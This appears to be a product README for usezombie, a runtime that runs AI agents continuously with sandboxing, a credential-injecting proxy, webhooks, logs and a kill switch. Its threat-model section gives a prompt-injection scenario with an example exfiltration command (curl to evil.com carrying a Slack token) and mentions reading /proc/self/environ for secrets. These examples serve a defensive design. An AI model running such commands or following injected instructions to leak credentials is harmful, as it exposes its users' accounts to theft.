# usezombie

**Run your agents 24/7. We handle the credentials, webhooks, and walls.**

---

## The Problem You Have Today

You built an agent. It replies to leads, triages Slack messages, handles support tickets, opens PRs — whatever. It works when you run it on your laptop. Then you try to make it run continuously:

- You paste your GitHub token / Slack token / API key into an env var.
- You wrap it in a Docker container and run it on a VPS.
- You hack together a webhook receiver with ngrok.
- You realize the agent can see your tokens in plain text.
- You realize if the agent gets prompt-injected via a malicious message, it can exfiltrate those tokens.
- You realize you have no log of what the agent actually did at 3am.
- You realize you have no way to stop it mid-action.
- You realize you've built half of Heroku but worse.

This is the gap. There are great tools for building agents (Claude, GPT, LangChain). There are great tools for sandboxing code execution (E2B, Vercel Sandbox). But there is nothing purpose-built for **running your agent continuously, with webhooks wired up, credentials hidden from the agent, and a log of everything it does**.

That's usezombie.

---

## What usezombie Is

A runtime for always-on agents.

You write your agent. You package it as a usezombie skill (or install one from clawhub). You tell usezombie which services it needs (email, Slack, GitHub, Jira). usezombie runs it in a sandboxed process with:

- **Webhooks wired** — your agent gets events from email, Slack, GitHub, etc. without you setting up ngrok or a custom server.
- **Credentials hidden** — your agent never sees a token. It makes normal HTTP requests. usezombie's firewall layer intercepts outbound traffic, injects the right credential per-request, and strips it from the agent's view.
- **Walls up** — the agent can only reach the services you declared. Everything else is blocked.
- **Logs of everything** — every request the agent makes, every webhook it receives, every credential used, timestamped and replayable.
- **A kill switch** — stop any agent from the web UI or CLI, mid-action.
- **A chat panel** — talk to your running agent. "How many leads today?" / "Pause replies." / "Show me the last 5 actions."

---

## What Ships First

Two skills. CLI + web interface. That's it.

### 1. Lead Collector

Your website has a contact form. Submissions go to your agentmail address. usezombie receives the webhook, your agent parses the email, generates an invite code, and replies — all within minutes, 24/7.

```
Your website form
    → submits to usezombie@agentmail.to
    → agentmail fires webhook to usezombie
    → your agent processes it:
        parse sender email
        generate invite code
        reply via agentmail
        log to activity stream
    → user gets reply with invite code
```

**Setup:**

```bash
# Install the skill
zombiectl install lead-collector

# Configure
zombiectl config set agentmail.address "you@agentmail.to"
zombiectl config set agentmail.webhook-secret "whsec_xxx"
zombiectl config set reply.template "Thanks for signing up! Your code: {{code}}"

# Run
zombiectl up
```

From the web UI, you see every signup, every reply sent, every code generated. You chat with the agent: "how many signups this week?"

**Why not Instantly or Smartlead?** Those are SaaS products with their own models and logic baked in. usezombie runs YOUR agent, YOUR prompt, YOUR model. You control the behavior. You own the data. You're not paying $180/seat/month for a sales tool when all you need is "reply to inbound signups with an invite code."

### 2. Slack Responder

Your team Slack gets questions in #support or #eng-help. Your agent reads new messages, classifies urgency, drafts a response or escalates to a human, and posts back — all without you watching the channel.

```
Slack channel message
    → Slack webhook fires to usezombie
    → your agent processes it:
        classify: question / bug report / request / noise
        if answerable → draft and post reply
        if urgent → tag @oncall in thread
        if noise → ignore
        log to activity stream
```

**Setup:**

```bash
zombiectl install slack-responder

zombiectl config set slack.webhook-secret "whsec_xxx"
zombiectl config set slack.channels "#support,#eng-help"
zombiectl config set slack.escalation-tag "@oncall"

zombiectl up
```

---

## How Credentials Work (The Core Technical Bet)

This is the thing that makes usezombie different from "just run it in Docker."

Your agent never sees a credential. Ever.

```
Agent process (sandboxed, bubblewrap + landlock)
    │
    │  Makes a normal HTTP request:
    │  POST https://slack.com/api/chat.postMessage
    │  Body: { channel: "#support", text: "..." }
    │  (no Authorization header — agent doesn't have one)
    │
    ▼
usezombie firewall layer
    │
    │  1. Match domain: slack.com → credential exists
    │  2. Check policy: agent allowed to call chat.postMessage? ✓
    │  3. Inject header: Authorization: Bearer xoxb-xxx
    │     (fetched from encrypted credential store, never written to
    │      the sandbox filesystem or env vars)
    │  4. Forward request
    │  5. Log: agent_id, endpoint, method, timestamp, response_code
    │  6. Return response to agent (stripped of any token echo)
    │
    ▼
Slack API receives authenticated request
```

**What this prevents:**

- Agent gets prompt-injected → tries `curl evil.com?token=$SLACK_TOKEN` → `$SLACK_TOKEN` doesn't exist in the sandbox. And `evil.com` is not in the allow list. Blocked.
- Agent tries to read `/proc/self/environ` for secrets → nothing there.
- Agent tries to write credentials to a file and curl it out → no credentials in memory, and the outbound domain is blocked.

**How it's built today:** The sandbox uses bubblewrap (user namespace isolation) + landlock (filesystem restriction). Outbound traffic routes through a proxy that handles credential injection. The proxy runs outside the sandbox boundary. The agent process cannot access the proxy's memory or credential store.

---

## The Skill Spec (Clawhub)

A skill is a YAML file that declares what the agent does and what it needs. The runtime reads this and configures the sandbox, webhook routing, and credential policy automatically.

```yaml
# clawhub: lead-collector
name: lead-collector
version: 0.1.0
description: "Reply to inbound signups with invite codes"

runtime:
  entrypoint: "bun run agent.ts"
  timeout: 30s

webhooks:
  - source: agentmail
    event: message.received
    config:
      address: "{{agentmail.address}}"

credentials:
  agentmail:
    inject_for: ["agentmail.to"]
    type: api-key
    header: "Authorization: Bearer {{secret}}"

network:
  allow: ["agentmail.to"]
  deny: ["*"]

chat:
  enabled: true
  commands:
    - "how many signups"
    - "pause"
    - "resume"
    - "show last N"
```

Install a skill, add your credentials to the usezombie credential store (never to the agent), and `zombiectl up`. The runtime does the rest.

---

## Interfaces

### CLI (ships first)

```bash
zombiectl install <skill>         # install from clawhub
zombiectl config set <key> <val>  # configure
zombiectl up                      # start all agents
zombiectl status                  # what's running, last events
zombiectl logs <agent>            # full activity log
zombiectl chat <agent>            # talk to a running agent
zombiectl stop <agent>            # kill switch
zombiectl credentials add <name>  # add a credential to the store
```

### Web UI (ships with v1)

Dashboard showing your workspace: running agents, recent activity, chat panel, credential store management, webhook status. Hosted at `app.usezombie.com` or self-hosted.

### Desktop / Mobile (later)

Not v1. The web UI covers the same ground. Desktop and mobile come when there's demand.

---

## What This Is (And What It Isn't)

**What it is:** A runtime for your always-on agents. You bring the agent. usezombie runs it safely, wires up webhooks, hides credentials, logs everything, and gives you a chat panel and kill switch.

**What it isn't:**
- Not an agent framework (use Claude, GPT, LangChain — whatever you want).
- Not a sandbox-as-a-service (E2B does that — usezombie is opinionated about credential isolation and always-on operation, not generic code execution).
- Not a SaaS tool with built-in AI (Instantly, Smartlead do that — usezombie runs YOUR agent).
- Not a workflow orchestrator (Temporal, Inngest do that — usezombie doesn't chain steps, it runs your agent process).

**One sentence:** usezombie runs your AI agent 24/7 without giving it your passwords.

---

## How usezombie Makes Money

### Runs

A "run" is one agent action cycle: receive event → process → respond → log.

| Plan | Always-on agents | Runs/month | Price |
|------|-----------------|------------|-------|
| Free | 1 | 200 | $0 |
| Pro | 5 | 5,000 | $29/mo |
| Team | 20 | 50,000 | $99/mo |
| Scale | Unlimited | 500,000 | $299/mo |

Overage: $0.10 per 100 runs.

**Why this pricing works:** A lead collector handling 10 signups/day = ~300 runs/month. A Slack responder in an active channel = ~1,000 runs/month. A free user with one agent gets enough to validate. A paid user with 5 agents across email + Slack + GitHub is in the Pro or Team tier.

The credential firewall, audit log, and chat panel are included in all tiers. They're not upsells — they're the product. Without them, you'd just use Docker.

### Later

- **Clawhub marketplace** — third-party skills, revenue share.
- **Compliance add-on** — extended retention, replay, SOC 2 audit trail. For enterprises.
- **Self-hosted license** — for teams that can't send traffic through hosted infra.

---

## Competitive Position

| If you need... | Use... | Not usezombie because... |
|----------------|--------|------------------------|
| A sandbox for code execution | E2B, Vercel Sandbox | They're for running generated code, not always-on agents with webhooks and credential isolation. |
| A sales outreach tool with built-in AI | Instantly, Smartlead | They're SaaS products. You don't control the agent, model, or prompt. |
| An agent framework | LangChain, CrewAI | They help you build agents. usezombie runs them. |
| A workflow orchestrator | Temporal, Inngest | They chain functions. usezombie runs a long-lived agent process. |
| Generic hosting | Railway, Fly.io | They run containers. usezombie adds credential isolation, webhooks, audit, and chat — the agent-specific stuff you'd have to build yourself. |

usezombie sits between "I built an agent" and "it runs safely in production, always on."

---

## What Exists Today

- `zombied` — Zig daemon. Workspace runtime, process supervisor.
- `zombie-worker` + `zombie-executor` (nullclaw) — spins agent sandboxes using bubblewrap + landlock. Runs to completion, observed.
- `zombiectl` — JS/Bun CLI. Skill management, workspace control.
- Sandbox: bubblewrap + landlock, no auth layer yet.
- Domains: `usezombie.sh` (agent-facing), `.com` / `.ai` (human-facing).
- GitHub: `https://github.com/usezombie`.

### What Needs Building for v1

1. **Credential store + firewall proxy** — encrypted store outside sandbox, TLS interception for credential injection. This is the core differentiator.
2. **Webhook router** — receive webhooks from agentmail, Slack, etc. and route to the right agent process.
3. **Always-on mode** — process supervision so agents restart on crash, run continuously (not just to completion).
4. **Web UI** — dashboard, activity stream, chat panel, credential management.
5. **Two skills** — `lead-collector` and `slack-responder`, packaged as clawhub specs.
6. **Chat interface** — send messages to running agents, get responses.

### What Doesn't Need Building for v1

- Desktop app
- Mobile app  
- Agent Auth protocol integration (v2 — when services adopt it)
- Marketplace / third-party skills
- Compliance / SOC 2 reporting
- Self-hosted option
